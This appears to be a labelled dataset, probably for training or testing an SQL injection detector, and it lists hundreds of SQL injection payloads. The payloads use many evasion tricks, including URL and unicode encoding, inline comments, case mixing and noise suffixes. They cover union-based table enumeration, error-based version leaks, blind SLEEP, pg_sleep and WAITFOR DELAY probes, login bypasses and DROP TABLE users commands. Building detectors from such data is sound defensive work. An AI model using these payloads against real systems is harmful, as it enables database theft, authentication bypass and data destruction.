"'					UNION					SELECT					1,2,3--", 1
"1'  UNION  SELECT  table_name,  null,  null  FROM  information_schema.tables  --#glv1g7pxvjh", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29    AND    'a' = 'a'--", 1
"%2527AND%0A1%2520%253D%2520convert%28int%2C%40%40version%29--%2F%2A%250a%2A%2F", 1
"adm%69n'%20O/*!*/R%09%09'1'	=%20'1", 1
"' or '1'iN (1)'1", 1
"'/**/UN/**/ION/**/SELECT/**/1,2,3--#7gustqf0p6", 1
"1%u0020AND%u00201%3D1", 1
"1' AND substring(database(), 1, 1) = 's' --#5yt5gg4ojvc", 1
"%27%2F%2A%2A%2FAN%2544%201%3D1%20%252d-%20", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2FIF%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%20%3D%2520%27a%27%2C%2F%2A%2A%2FSLEEP%285%29%2C%2F%2A%2A%2F0%29%2F%2A%2A%2F--", 1
"1' unION sELECt TABlE_nAme, NUlL, Null FROm inFORmAtIoN_SCHemA.TAblEs  -- random_noise----r1bifrsbkc", 1
"1%u0%3027%%750020OR%u0%3020IF%28substring(d%61ta%62ase(),%u%300201,%%7500201)=%u0027a%u0027,%u002%30SL%45EP(5),%u00200)%u0020--", 1
"'/*!*/AND%201 =%201%20 OR 'b'='b'--%20#m6rrpvz", 1
"%U0027%U0020OR%U00201=1%u0020 /*!*/AND 1=1--%u0020", 1
"TeST'/**/Or/**/'1'='1'/**//*", 1
"%74est%2%37%2%30OR%20%271%%327%3D%271%27%20--%20#lgpnwdrtiu", 1
";/**/DrOp/**/TABlE/**/uSeRS;/**/--", 1
";          SELECT          pg_sleep(5);          --#jkm5f926yp", 1
"1%u0027OR%0aIF(substr%69ng(d%61tabase(%29,1,", 1
"1)=%u0027%61%u0027,SLEEP(5%29,/%2a%0d%0a%2a/0)--#cpfzm", 1
"1%U0027%U0020Or%u0020ascIi(su%62STrIng(%64%61%74a%62AS%65(),%U00201,%U00201))%U0020%3e%U0020100%U%3002%30%2d-", 1
"1'ORIF(substring(database(),", 1
"1,1)>='a',SLEEP(5),0)----rgzwhm1w0", 1
"test%27OR/*%0a*/%271%27%3D%271%27--/*%0d%0a*/", 1
"'/*!12345*/OR%20EXIST%53(SELECT 1 FROM%20user%73)--", 1
"%31))%20U%4eION%09SELECT%091,database(),3%2d-", 1
"'AND1=convert(int,@@version)--/*%0d%0a*/", 1
";%20se%4cECt%2%30pg_SLEep(5%29%3B%20 %23 mOrE_noiSE--", 1
"WaiTFOR/**//**//**//**/dElAY/**//**//**//**/'0:0:5'----WR9qguS2", 1
"'%20%20%20%20%20UN/*!12345*/ION%20%20%20%20%20SELECT%20%20%20%20%20null,%20%20%20%20%20null,%20%20%20%20%20null%20%20%20%20%20--%20%20%20%20%20", 1
"'/**/OR/**/1=1/**%2f%2d%2d/**/", 1
"%27%20%20%20AND%20%20%201%2520%3D%20convert%28int%2C%40%40version%29--", 1
"1%29%2F%2A%2A%2FUN/*!*/ION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cdatabase%28%29%2C3--", 1
";	DROP	TABLE	users;	--", 1
"'/**/UniOn seLECt NulL, Null, nulL --", 1
"1)%20UNION%20SELECT%201,database(),3--#36jze0z", 1
"test'OR", 1
"'1'LIKE'1'%0a/*/*%0d%0a*/", 1
"1) UNION SELECT 1,database(),3 # more_noise--#1sttq", 1
";%09%09%09SELECT%09%09%09pg_sleep(5);%09%09%09----o4kycss", 1
"1%u0020%41ND%u00201=1", 1
"WA%49%54FO%52 DELAY '0:0:5'--", 1
"1%u0020&&%u00201=1 OR (1)", 1
"' anD 1>=cOnVeRT(iNT,@@VerSIon)--", 1
"'		AND		1%09=	1		--", 1
"%27%2F%2A%21%2A%2F%20%20%20%20XOR%20%20%20%20%201%09%3D%2509convert%28int%2C%40%40version%29--", 1
"admin%27OR%271%27%3E%3D%271%250d%250a", 1
"1%2F%2A%2112345%2A%2FAND%201%3D1%235m0r2rc4sc8gntx", 1
"tEst%27%20Or%20%271%27%3D%271%27%20/*", 1
"1%25u0027%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F%2F%2A%2A%2F--%2F%2A%2A%2Frandom_noise--", 1
"1/**/AND/*%2a/%31=1", 1
"test' OR '1'='1' /*--j1psfac89o", 1
"' oR %31=%31 --", 1
"' XOR extractvalue(1,concat(0x5c,version())) /*!*/AND 1=1--", 1
"' OR exIStS(SelE%43T%201 FRO%4D US%65Rs)--", 1
"1)/**/UNION/**/SELECT/**/1,database(),3--#s43prro", 1
"%u0027/**/OR/**/1=1/**/--/**/#7407w0swe", 1
"1)%20%20UNION%20%20SELECT%20%201,database(),3/*!*/AND%0a1=1--/*%0a*/", 1
"%u0027%u0020A/*!12345*/ND%u00201=convert(int,@@version)----6eblb6", 1
"%3b%25U0020drOp%25u0020TablE%25u0020UsErs%3b%25U0020--", 1
"a%64m%69n' OR '1'='1", 1
"'/**/unIoN/**/sElECt/**/1,2,3--", 1
"1))%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u00201,database(),3--", 1
"1)/**/UNION%20SELECT%201,database(),3----wgmu3z6ln353ku6", 1
"test'OR%0a'1'='1'/* -- random_noise--jxl18w6", 1
"%u0027OR", 1
"EXISTS(SELECT1FROMusers)%20AND%20%27a%27%3D%27a%27--/*%0d%0a*/", 1
"ADmin' || (1>=1)'1'='1#aeferk", 1
"test%27%20OR%%32%30%27%31%27%3D%271%27%20%2d-%20", 1
";/**/  DROP   TABLE   users;   --", 1
"1/*!*/AND1=1/*%0d%0a*/", 1
"; Drop %54aBlE U%73e%72S; --", 1
"%u0027/**/OR%u0020%u00271%u0027IN%u0020(1)%u00271", 1
"1'/*!12345*/or/**/IF(SUbStriNG(DaTabASe(),/**/1,/**/1)='a',/**/sLEeP(5),/**/0)/**/--", 1
"'/*!12345*/UNION SELECT null, null, null  OR 'b'='b'--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 OR (1)--", 1
"'UNIONSELECTnull,null,%0anull--random_noise--%0d%0a", 1
"%u0027%U0020uNIoN%U0020SEleCt%u00201,2,3----svWNz5", 1
"1%%327%2509%2509%2509OR%250%39%2%35%309%%32509ascii%28substring%28database%28%29%%32%43%25%309%2509%25091%2C%%32%35%309%2509%%325091%29%29%2509%2509%2509%3E%2509%2509%2%3509100%2509%25%309%2509--", 1
"%27%20%20OR%20%20%271%27%20%20%3D%20%271", 1
"%27AND1%3D1--%2F%2A%250d%250a%2A%2F", 1
"%u0027/**/UNION%u0020SELECT%u00201,2,3 AND 'a'<='a'--", 1
"'AND", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"' UNiON sELeCT NuLl, NULL, Null --", 1
"%u0027%u0020UNION%u0020sELect%u0020nuLl,%u0020NULL,%u0020nuLl%u0020%u0020OR%u0020(1)--%u0020#34lpz189igqm99f", 1
"%3B%20S%45LECT%20pg%5fsleep%285%2%39%3B%2%30--", 1
"test'/**/||/**/(1=1)'1'='1'/**//*#zs41rl94cgm", 1
"%27ANd%0d%0aExTRACTValu%65(%31,cONCAT(0X5c,vERsiON%28%29))----f%54%44443tiBft/*%0d%0a*/", 1
"1%u0027/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/----kjfetvkpb", 1
"TeST%27%20OR%20%271%27%3d%271%27%20--%20--f8tm0vesl77qt", 1
"tEst'   || (1=1)  '1'%09=%20'1'   /*", 1
"test%27OR/*%0d%0a*/%271%27%3D%271%27%0d%0a/*", 1
"1'%09%09%09%09AND%09%09%09%09substring(database(),%09%09%09%091,%09%09%09%091)%09%09%09%09	=	%09%09%09%09's'%09%09%09%09--", 1
"%27/*!*/aND%20ExtRACTVALUE(1,COnCaT(0X5C,veRSiOn()))--", 1
"teST%27%20OR%20%271%27%3D%271%27%20/*%20or%20%27b%27%3d%27B%27", 1
"' or '1'in (1)'1 /*!*/and 1=1", 1
"1%27%20OR%20IF(s%75bst%72ing%28databa%73e()%2c%201,%201)%3D%27a%27,%20%53LEEP(5),%200)%20%2d-#prbludaxg5", 1
"1A/*!12345*/ND1=%31/*%0a*/", 1
"; SELE%43T pg_s%6ceep(5%29; --", 1
"1%27%20O%52%20ascii(sub%73tring(%64atabase(%29,%201,%%3201))%20%3E%20100%20%2d-", 1
"1/**/A/*!*/ND/**/1=1", 1
"%3B%20DROP%20TABLE%20users%3B%20--#dzck6uz5q", 1
"%2527%2520UNION%2520SELECT%25201%2C2%2C3--%231s0o5j7", 1
"%27%20OR%201%3D1%20--%20#v6s9y", 1
";%09%09%09%09SELECT%09%09%09%09pg_sleep(5);%09%09%09%09--", 1
"1%20AND 1=1", 1
"' %20   UNI%4fN    %20%53ELEC%54     nul%6c,     null,     %6eull     --", 1
";%u0020sELecT%u0020pg_SLEep(5);%u0020--", 1
"%31%u0027/*%2a/UN%49ON/**/SELECT/**/table_name,/**/null,/%2a*/n%75ll/**/F%52OM/**%2fin%66ormatio%6e_schema.ta%62les/**/--", 1
"1%2f**/aND%201%3%441", 1
"1))uniOn%0aSeLeCt", 1
"1,dAtabaSe(),3--%0a", 1
"; Select pG_sLEeP(5); --", 1
"'/*!*/AND     extractvalue(1,concat(0x5c,version()))--", 1
"%27/*!*/OR%201%3D1%20--%20#iixgn6", 1
"test%%327%20OR%%320%271%27%3D%271%27%20/*-%2do0%7anjz5wp%35jhvu", 1
"' ANd 1=conveRT(Int,@@VERsIon)--", 1
"%61dmin%27OR%0a'1'%3d'1/*%0d%0a*/", 1
"test%27%20OR%20%271%27%3D%271%27%20 OR (1)--%20--xlv071noqkvyhia", 1
"%27%20Or%20%271%27%3D%271", 1
";SELECT%0apg_sleep(5);--", 1
"admin'||%0a'1'='1OR(1)", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)  = %u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"%31%27%09%09%09%0%39%09UNION%0%39%09%09%0%39%09SELECT%%309%0%39%09%09%09ta%62le_name,%09%09%09%09%09null,%09%09%09%09%0%39nul%6c%09%09%09%09%09FROM%09%09%09%09%0%39information_sc%68e%6da.table%73%09%09%%309%0%39%09--", 1
"admin'/**/XOR '1'='1", 1
"1%u0027%u0020uniOn%u0020selECT%u0020tABLe_nAMe,%u0020NULl,%u0020nulL%u0020fRom%u0020inFORMaTIon_SchEma.taBlEs%u0020--", 1
"1%20AND%201%3d1", 1
";SeleCt/*%0%61*/Pg_Sl%65EP(5);%0%64%0a--%0a", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020%20%20%20%20%20--%20%20%20%20%20random_noise--%u0020#nc3i8oiyd48tio", 1
"wAItFOr%20dElAy%20%270:0:5%27--", 1
"' oR '1'>='1", 1
"' UniOn SelECT NUll, nuLl, nULl --", 1
"1) U%4eION S%45LEC%54%201,database(),3--", 1
"1'/*!12345*/UniOn SElECt taBLe_namE, NULL, NULl frOM inFoRmAtIoN_sCheMA.tAbleS --", 1
"'		UNION		SELECT		null,		null,		null		--", 1
"1/**/AND/**/1=1--21elhzdfya6hxq", 1
"'OR'1'='1/*!*/AND%0a1=1", 1
"1%u0020AND%u00201%09=%091", 1
"1%41ND/*%0d%0a*/1=1", 1
"", 1
"test%27OR%0d%0a%271%27%3D%271%27%0d%0a/*", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#5602iyw4tt2", 1
"1AND", 1
"1  =  1%2f*%0d%0%61*/", 1
"' OR '1'='1--yiwu3e1l5", 1
"1)/**//**//**//**/unIOn/**//**//**//**/SELEcT/**//**//**//**/1,DatABAsE(),3----yxckdoe5k3v1", 1
"' || 1=1%20-%2d", 1
"'%09%09%09%09UNioN%09%09%09%09selEcT%09%09%09%091,2,3--", 1
";/**/DR%4fP TA%42LE %75sers; --", 1
"1%27%20or%20ascIi(SuBStRInG(dAtABAsE(),%201,%201))%20%3E%20100%20 -- random_noise--", 1
"'        AND        extractvalue(1,concat(0x5c,version()))        OR        'b' =	'b'--", 1
"1)/**/UNiON/**/selECT/**/1,dAtABaSE(),3--", 1
"1)  %55NIO%4e  %53ELECT  1,da%74abase(),3--", 1
"1'ORIF(substring(database(),1,1)='a',SLEEP(5),/*%0d%0a*/0)--", 1
"%27%20UN/*!*/ION%20SELECT%201,2,3--", 1
"%27%20uN/*!*/ion%20SelECt%201%2c2%2c3--", 1
"test' || '1'='1' -- #4xn8rs", 1
"1%27%2F%2A%2A%2F%26%26%20%281IN%20%281%291%29substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"'/**/AND/**/1=convert(int,@@version) AND 'a'='a'--", 1
"%27%09OR%09%271%27%3C%20%20%3D%09%271", 1
"1 && 1=1 || (1)#qiac40l4xpo6", 1
"1' UNi%4f%4e SelECT tABle_NA%4dE, NU%6cl, NUlL fRO%4d I%4eFOrMatiON_SchEMA%2etaBl%65S --", 1
"1%27%20OR%20if%28sUbSTRinG%28dAtAbASe%28%29%2c%201%2c%201%29%3d%27a%27%2C%20SLeep%285%29%2c%200%29%20--", 1
"1' OR ascii%28substring%28dat%61b%61se(), 1, 1)) > 100%20--", 1
"1%27%20OR%20IF%28substring%28%64atabase%28%29%2C%20%31%2C%201%29%3D%27%61%27%2%43%20%53L%45EP%28%35%29%2C%2%30%30%29%20--", 1
"WAITFOR DELAY '0:0:5'----sh6j1", 1
"%27%20UNION%20SELEC%54%201,2%2c3%2d-", 1
"1%u0027%20%20%20UNION%20%20%20SELECT%20%20%20table_name,%20%20%20null,%20%20%20null%20%20%20FROM%20%20%20information_schema.tables%20%20%20----i7jrwd", 1
"%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%20OR%20%27b%27%3D%27b%27", 1
";DROPTABLEusers;/*%0d%0a*/--", 1
"admin'/**/OR/**/'1'IN/**/(1)'1", 1
"%61dmin%u0027/**/%4fR/**/%u00271%u0027=%u00271", 1
"'%20%20%20%%320%20AND%20%20%20%20%201", 1
"%3d	conver%74(in%74,@@%76e%72sion)--%0a", 1
"'AND/*%0d%0a*/1=%63onver%74(int,@@vers%69%6fn)--#1xu8ff4%6anf", 1
"", 1
"%27%20&&%20extractvalue(1,concat(0x5c,version()))--#e9f3rrj", 1
"1) UNiON SelECT 1,datAbAse(),3 And 'a'='A'--#bT66w2ny", 1
";/**/SEL/*!12345*/ECT/**/pg_sleep(5);/**/--", 1
"; DrOp tabLE users; --", 1
"'/*!1%32345*/AND %31=convert(int,%40@version%29%2d-", 1
";%20SELECT%20pg_sleep(5);%20--#06myy0", 1
"%27%20OR%20%25271%27%253d%271", 1
"test'OR%0d%0a'1'='1'--%0a--t3xy57pmt", 1
"1%20%20AND%20%201%09=%091", 1
"'/**/||/**/1=1/**/--/**/", 1
"' aND 1=1  # mOre_NOISe--", 1
"%27%20UNIO%254e%20%2553ELECT%201%252c2%2C3--", 1
"%27%20||%20%271%27%3D%271--lygqvuh", 1
"test'/**/OR '1'='1' /*--pckog68lk", 1
"%u0027/**/UN/*!12345*/ION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"%%32%37%2%30OR%20EXI%53TS(S%45LECT%201%20FROM%20users)--", 1
"%27/**/OR%201%3D1%20--%20", 1
"admin%27%%320OR%20%271%27%3D%271%%32%30OR%20%27b%%32%37%3D%27b%27", 1
"' UNION SELECT 1,2,3 # more_noise----0m1hr3x4541", 1
"1%27%20oR%20ascII(substriNg(DAtaBasE(),%201,%201))%20%3E%20100%20--", 1
"1'					OR					AScii(SubsTrINg(dATABASE(),					1,					1))					>					100					--", 1
"%27%20An%44%201%3%641%20--%20", 1
"'OR/*%0d%0a*/'1'='1/*%0d%0a*/AND'a'='a'/*%0d%0a*/", 1
"1%27/**/||%20(1%3D1)ascii(substring(database(),%201,%201))%20%3E%20100%20 AND 'a'='a'--", 1
";/**/SELECT				pg_sleep(5);				--", 1
";/*!*/SeLECT PG_sLEEP(5); --", 1
"1%u0027/*!12345*/AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020%u0020--%u0020random_noise--", 1
"%27%20AND%20%31%3dconver%74(int,@%40version) AND 'a'='a'--", 1
"'/**/OR/**/EX%49STS(S%45LECT/**/1%2f**/F%52OM/**/users)----zj2jmg%30%35w%31", 1
"'%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%20null,%20%20%20%20null,%20%20%20%20null%20%20%20%20--%20%20%20%20", 1
"%u0027/*!*/OR/**/1>=1/**/--/**/", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020----e7ytsfcfi2ul", 1
"'%2F*%2112345%2A/anD 1=1  OR 'b'%3D'B'--", 1
";DrOpTABle/*%0a*/usErs;--", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))----51kb4dayxwj", 1
"1%2527%2520AND%25%2532%2530subs%2574ring%28da%2574ab%2561se%28%2529%2C%25201%2C%25201%29%2520%253D%2520%2527s%2527%2520--", 1
"admIN'/**/oR '1'='1", 1
"WAITFORDELAY%0a'0:0:5'--%0d%0a#zm732saeaoc5", 1
";/**/DROp/**/TABLe/**/USerS;/**/ # MOrE_NOisE--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29%20OR%20%281%29--", 1
"'%20uNIoN selECT NuLL, %6EuLL, Null -%2D%20--392l3qa1wbu9s", 1
"test'/**/OR/**/'1'='1'/**//*#x116ch14bbq9uqz", 1
"' OR '1'>='1--i23l4lfls", 1
"1'%09AND%09substring(database(),%091,%091)%09/*!*/ =%09%09's'%09--#89ztczvd", 1
"'  OR  1 =%091  --", 1
"' UNION SELECT null, null, null -- #si6ni", 1
"1%41ND", 1
"1=1/*%0d%0a*/", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0020OR%u0020(1)", 1
"%27%20AND%201%3E%3Dconvert(int,@@version)--", 1
"' OR '1'='1 # more_noise#ppkdpo", 1
"'/**/UniON/**/SEL/**/ECT/**/1,2,3--", 1
"'/**/OR/**%2fEXISTS%28SELECT/**/1/**/F%52%4fM/**/users)%2d-", 1
"1%27%20UNIO%4e%20SELECT%20table_name%%32C%20null%%32C%20null%20FROM%20in%66ormatio%6e%5fsc%68em%61.tabl%65s%20--", 1
"teSt%27%20OR%20%271%27%3d%271%27%20%20Or%20%27b%27%3d%27B%27--%20", 1
";/*!%2a/S%45LECT    pg_s%6ceep(5);    --", 1
"1'UNION%0aSELECTtable_name,null,null/*%0a*/FROMinformation_schema.tables/*%0d%0a*/--", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/#bxb5ghao", 1
"'/**/UNI%4fN S%45LECT null, n%75ll, %6eull --", 1
"; DROP TABLE users;  && (1=1)'a'='a'--#2832cx7x259tjzu", 1
"1))UNION%0aSELECT1,database(),3--", 1
"' O%52 EX%49STS(SELECT%201 %46ROM users)--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--#ljfry02dvnkgvgf", 1
"'oREX%49STS(sE%4cect", 1
"1%46RoM%75SerS)--RAND%6fM_NoiSE--", 1
"1'/*!*/OR			IF(substring(database(),			1,			1)%09=/**//**/'a',			SLEEP(5),			0)			----whxpldurxgcrv", 1
"%u0027%u0020Or%u0020exIsTS(SElEcT%U00201%U0020from%U0020USeRs)--", 1
";/*!12345*/SELECT pg_sleep(5);  # more_noise--", 1
"1%u0020AND%u00201=1%u0020/*%21%2a/AN%44%u00201=1", 1
"test%27O/*!*/R%271%27%3D%271%27--/*%0a*/", 1
"%27/*!12345*/AND%201%3D1%20-%2d%20", 1
"'/**/uNIOn/**/sElECT/**/nUlL,/**/nUlL,/**/NuLL/**/--/**/", 1
"'AND%0d%0a1=convert(int,@@version)--%0d%0a", 1
"'/**/AnD/**/1in (1)cONveRT(InT,@@VErSIOn) -- raNdoM_nOiSe--", 1
"'/**%2fA%4eD/%2a*/1	=	convert%28%69nt,@@version)--", 1
"%27/**/AND/**/%31=1/**%2f--/**/", 1
"1%u0027%u0020AND%u0020SUbsTRiNG(DAtaBase(),%u00201,%u00201)%u0020=%u0020%u0027S%u0027%u0020 OR 'b'='b'--#o33z5yx4q88", 1
"%27%20O%52%09exists(sEleCt%091%09frOM%09usERS)%2d-", 1
"1) UNIO%4e %53ELECT 1%2cdatab%61se(),3--", 1
"1)) UNION SELECT 1,database(),3----e9ghjavi4ou0", 1
"1)UNIOn", 1
"seLECt1,dATAbAse(),3--", 1
"1' oR ASc%49I(sUBStriNG(DaTAb%41S%65(), 1, 1)) > 1%300%20--", 1
"1/*!12345*/AND%201%3d1", 1
"%u0027%u0020OR%u00201%20=  %31%u0%3020-%2d%u0%3020  /*!*/AND  1%20=  1", 1
"%57AITFO%52DELAY", 1
"'0:0:5'-%2d", 1
"%3BSELECT%250apg_sleep%285%29%3B%250d%250a--%2F%2A%250d%250a%2A%2F", 1
"%27%20U%4eIO%4e%20SELE%43T%20null,%20null,%20nu%6cl%20--%20", 1
"%27%20anD%20extRaCtvALUE(1,cOnCAt(0x5C,VerSION()))--", 1
"%27%20and%201Like1%20--%20", 1
"'aND%0d%%30aEXTr%61CtValuE(1%2cConc%41t(0X5c,V%45rsION())%29--/*%0d%0a*/", 1
"1 &&%201=1 OR 'b'='b'", 1
"'/**/UNION/**/SELECT/**/null,%20n%75l%6c,/**/null/**/--%20", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29/**/#/**/more_noise--", 1
"1%29%20UNION%20SeLECT%201%2CDataBaSe%28%29%2C3--", 1
"'/**//**//*%2a/XOR/**//**//**/extra%63tvalue(%31,concat(0x5c,versi%6fn(%29%29)-%2d", 1
"WAIT%46OR DELAY%20'0:0:5%27%20/*!*/AND 1=1----l1b95ie5tezzys", 1
"1)/**/unION/**/sEleCT/**/1,DatabAsE(),3--#ljo7t7", 1
"%u0027%u0020OR%u0020%u00271%u0027>=%u00271--cu79f9bqim7l4jm", 1
"1'%20OR IF(SubSTr%69Ng(dATAb%61sE(), 1, 1%29='a', s%4c%65ep(5), 0) --", 1
"test%27%254fR%2F%2A%25%2530d%250a%2A%2F%271%27%3D%271%27%250a%2F%2A%250a", 1
";DROPTABLEusers;%0a--/*%0d%0a*/", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3 AND 'a'='a'----qttf5", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29%09%09%09%09||%09%09%09%09(1 =  1)'b' =  'b'--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20----1d8z1tqtwpy", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20--#v3hfkxvtehj", 1
"1%u0027%u%30020A%4eD%u0020substring(%64%61t%61base(),%u002%301,%u00201)%u0%302%30	>= %u0020%u0027s%u0027%%750020--", 1
"test'/*!12345*/OR '1'IN (1)'1' --", 1
"%27%20%20AND%20%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--#oehj0hk4fk", 1
";%53ELECT%0apg_sleep(5%29; -- random_noise--%0a", 1
"1%29%2520UNION%2520SELECT%25201%2Cdatabase%28%29%2C3 # more_noise--", 1
"test%27%2F%2A%2112345%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"%27%20&&%20(1%3D1)extractvalue(1,concat(0x5c,version()))--", 1
"1' OR AsCIi(substRIng(datABasE(), 1, 1)) > 100 --", 1
"%27    OR    '1%27 =%09'1", 1
"1%27%20Or%20if%28sUBsTrING%28DatAbase%28%29%2c%201%2c%201%29%3d%27A%27%2c%20slEEP%285%29%2C%200%29%20--", 1
"test%27%20O/**/R%20%271%27%3D%271%27%20--%20--udibrz9bzeql", 1
"1))UNION/*%0d%0a*/SELECT1,database(),3--", 1
"", 1
"test'OR'1'	='1'/*!*/AND1=1--%0a#lg02jx", 1
"'%20%20%20XOR%20%20%201=%0d%0a1%20%20%20--%20%20%20--9mpb7ej4h7c", 1
"%%32%37%20OR%20EX%49STS%28SELECT%201%20FROM%20user%73)--", 1
"1%2F%2A%2A%2FAND%2F%2A%2A%2F1%3D1", 1
"1AND%250d%250a1%3D1%250d%250a -- random_noise", 1
"%27OR%271%27%3D%271%0d%0a%20OR%20(1)--ih4op24lzocui8", 1
";%20DROP%20TABLE%20users;%20#%0d%0amore_noise--%0a", 1
"1/**/AND/**/1=1--tfswo1iwfb", 1
"1'    OR    IF(substring(database(),    1,    1) =%09'a',    SLEEP(5),    0)    ----izcn7gq", 1
"'%20%20UNION%20%20SELECT%20%201,2,3--", 1
"'||eXiStS(Select1fROm/*%0A*/usErs)--", 1
"t%65st'/**/OR%20'1'='1'/**//* -- random_noise--l9g8g", 1
"WAITFORDELAY'0:0:5'--%0d%0a", 1
"1'/**/O/*!12345*/R/**/if(sUbSTRinG(datAbaSE(),/**/1,/**/1)='A',/**/SLeEP(5),/**/0)/**/--", 1
"1%u0027%09%09%09OR%09%09%09IF(substring(database(),%09%09%091,%09%09%091)	=%09%u0027a%u0027,%09%09%09SLEEP(5),%09%09%090)%09%09%09--", 1
"'/**/XOR/**/'1'IN (1)'1", 1
"admin'%4fR'1'='1%0%61", 1
";SELECT", 1
"pg_sleep(5);--%0d%0a", 1
"%u002%37%u0020UNION%u0020SELE%43T%u002%301,2,3-%2d", 1
"' && extractvalue(1,concat(0x5c,version())) AND 'a'='a'--#pgrfajesntag", 1
"1'ANDsubstring(database(),1,/*%0d%0a*/1)<	=	's'/*%0d%0a*/ /*!*/AND 1=1--", 1
"' aNd ExTrACTVaLUe(1,COncAT(0X5C,verSION()))--", 1
"%u0027%u0020||%u0020%u00271%u0027	=%20%u00271", 1
"1%2527%2520OR%2520IF%28substring%28database%28%29%2C%25201%2C%25201%29%253D%2527a%2527%2C%2520SLEEP%285%29%2C%25200%29%2520--", 1
"%3B%20SELECT%20pG_slEEP%285%29%3B%20--%230gaw66Od8Aa5Ji", 1
"1 AND 1=%31", 1
"wAItFOr/**/deLaY/**/'0:0:5'--", 1
"admin%u0027%u0020%u0020OR%u0020%u0020%u00271%u0027%09=%u0020%u00271", 1
"teST%27%20or%20%271%27%3d%271%27%20--%20", 1
";/*!12345*/DR%4f%50 TABLE u%73ers; --#xzbcp0", 1
"1))/**/UNION/**/SELECT/**/1,database(),3 AND 'a'='a'--", 1
"TesT' Or '1'<='1' /*", 1
"1' AND substriNG(DaTAbAsE(), 1, 1) = 'S' ----l4w1y0", 1
"1)/**/UNION/**/SELECT/**/1,database(),3/**//*!*/AND/**/1IN (1)1--", 1
"tEST' || (1=1)'1'='1' /*", 1
"1)    UNION    SELECT    1,database(),3--", 1
"%27OR/*%0a*/1%3D1%20AND%20%27a%27%3D%27a%27--/*%0a*/%0d%0a", 1
"'/**%2fOR/**/EX%49STS(S%45LECT/**/1/**/FROM/**/u%73e%72s)--", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20----o3i9aja6", 1
"test%27%20OR%20%271%27%3D%271%27%20%20/*!*/AND%201%3D1--%20", 1
"1/*!*/AND 1=1 AND 'a'='a'", 1
"1))UNIONSELECT/*%0a*/1,database(),3/*%0a*/#more_noise----ngeo7wz%0a", 1
"teST'/**/or/**/'1'='1'/**//*", 1
